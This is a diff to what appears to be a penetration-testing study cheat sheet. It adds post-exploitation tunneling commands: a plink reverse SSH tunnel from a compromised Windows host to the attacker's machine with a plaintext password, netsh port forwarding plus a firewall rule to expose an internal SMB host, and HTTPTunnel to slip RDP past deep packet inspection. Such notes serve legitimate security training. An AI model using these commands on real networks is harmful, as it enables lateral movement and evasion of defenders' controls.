@@ -697,8 +697,39 @@ socks4 	127.0.0.1 8080
 kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
 ```
 
-\
+### PLINK.exe
 
+ssh reverse tunnel after getting a shell for windows
+
+```
+C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+```
+
+```
+C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+```
+
+### NETSH
+
+expose another machine in the victim network
+
+```
+C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+```
+
+### HTTPTunnel-ing Through Deep Packet Inspection
+
+To do this, we will create a local forward (-L) from this machine (127.0.0.1) and will log in as student, using the new password we created post-exploitation. We will forward all requests on port 8888 (0.0.0.0:8888) to the Windows Server's remote desktop port (192.168.1.110:3389):
+
+```
+www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+
+student@debian:~$ hts --forward-port localhost:8888 1234
+hts --forward-port localhost:8888 1234
+
+kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234
+```
 
 ## Password Attacks
 
